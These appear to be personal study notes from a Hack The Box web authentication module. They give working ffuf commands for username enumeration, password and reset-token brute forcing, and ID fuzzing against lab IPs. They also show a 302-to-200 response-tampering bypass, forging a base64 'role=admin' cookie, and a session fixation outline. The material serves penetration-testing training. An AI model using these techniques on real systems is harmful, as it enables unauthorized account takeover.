
#  Enumerating Users

-  Enumerating Users via Differing Error Messages

```sh
ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.82:32732/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user" 
```

- custom wordlist 

```sh
  grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt  | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```


```sh
ffuf -w ./custom_wordlist.txt -u http://154.57.164.72:31172/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
```

# Brute-Forcing Password Reset Tokens

- To identify weak reset tokens, we typically need to create an account on the target web application, request a password reset token, and then analyze it to determine its strength.

```txt
Hello,

We have received a request to reset the password associated with your account. To proceed with resetting your password, please follow the instructions below:

1. Click on the following link to reset your password: Click

2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351

Please note that this link will expire in 24 hours, so please complete the password reset process as soon as possible. If you did not request a password reset, please disregard this email.

Thank you.
```


-  Attacking Weak Reset Tokens

```sh
seq -w 0 9999 > tokens.txt
```

- then we fuzz

```sh
ffuf -w ./tokens.txt -u http://weak_reset.htb/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

# Default Credentials

- find default creds : https://www.cirt.net/passwords

# Guessable Password Reset Questions

-  [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv) CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world
- we generate the wordlist 

```sh
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

# Authentication Bypass via Direct Access

- browse to the `/admin.php` endpoint in the web browser. Next, right-click on the request and select `Do intercept > Response to this request` to intercept the response:

![ima|1500](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/269/bypass/bypass_directaccess_2_2.png)

- To force the browser to display the content, we need to change the status code from `302 Found` to `200 OK`

![imgg|1500](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/269/bypass/bypass_directaccess_3.png)

# Authentication Bypass via Parameter Modification

- we can brute force the `id` to login as `admin`

```sh
ffuf -w ./ids.txt  -u "http://154.57.164.77:30532//admin.php?user_id=FUZZ" -fr "Could not load admin data"
```
# Attacking Session Tokens

## Brute-Force Attack

- let us send the login request multiple times and take note of the session tokens

```sh
2c0c58b27c71a2ec5bf2b4b6e892b9f9
2c0c58b27c71a2ec5bf2b4546092b9f9
2c0c58b27c71a2ec5bf2b497f592b9f9
2c0c58b27c71a2ec5bf2b48bcf92b9f9
2c0c58b27c71a2ec5bf2b4735e92b9f9
```

- As we can see, all session tokens are very similar. In fact, of the 32 characters, 28 are the same for all five captured sessions. The session tokens consist of the static string `2c0c58b27c71a2ec5bf2b4` followed by four random characters and the static string `92b9f9`, so we can brute force it 
## Attacking Predictable Session Tokens

![im](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/269/session/session_3.png)

- While this session token might seem random at first, a simple analysis reveals that it is base64-encoded data:

```sh
echo -n dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy | base64 -d

user=htb-stdnt;role=user
```

- creation or an admin cookie

```sh
 echo -n 'user=htb-stdnt;role=admin' | base64

dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
```

## Session Fixation

1. An attacker obtains a valid session token by authenticating to the web application. For instance, let us assume the session token is `a1b2c3d4e5f6`. Afterward, the attacker invalidates their session by logging out.
2. The attacker tricks the victim into using the known session token by sending the following link: `http://vulnerable.htb/?sid=a1b2c3d4e5f6`. When the victim clicks this link, the web application sets the `session` cookie to the provided value,
3. The attacker session now is became an admin session